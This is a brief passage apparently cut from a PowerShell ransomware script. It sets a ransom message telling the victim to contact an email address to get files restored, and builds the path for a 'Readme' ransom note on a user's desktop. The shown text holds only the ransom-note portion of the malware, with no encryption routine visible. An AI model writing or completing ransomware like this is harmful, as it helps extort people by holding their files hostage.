...
# Ransom message
$msg = "If you want your files restored, please contact me at garethmckie3l@protonmail.com. I look forward to doing business with you ;-)"

# Create the Readme file
$readme = "C:\Users\Bob\Desktop\Readme.READ"
